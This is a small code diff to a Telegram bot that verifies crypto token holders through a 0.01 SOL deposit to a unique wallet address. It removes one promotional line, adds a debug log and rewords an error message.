@@ -63,8 +63,6 @@ Always verify you are using the correct Telegram handle, and never send tokens o
 2️⃣ Click the start button below to receive your unique wallet address for this verification.
 3️⃣ Send 0.01 SOL to this unique wallet address from your wallet in which you hold ${ENV.TOKEN_SYMBOL} or from which you have staked your ${ENV.TOKEN_SYMBOL}.
 
-Ready to prove your whale status? 🌊✨
-
 Press the button below to begin the validation process.`;
     await bot.sendPhoto(msg.chat.id, ENV.IMAGE_URL, {
         caption: text,
@@ -84,6 +82,7 @@ Press the button below to begin the validation process.`;
 
 
 bot.on('callback_query', async (callbackQuery) => {
+    console.log(callbackQuery)
     const action = callbackQuery.data;
     const userID = callbackQuery.from.id;
     const msg = callbackQuery.message;
@@ -140,7 +139,7 @@ bot.on('callback_query', async (callbackQuery) => {
         
     } catch(e) {
         validationStatus.delete(msg?.chat?.id);
-        console.error(e);
+        console.error(`Error in callback_query: ${e}`);
     }
 });
 
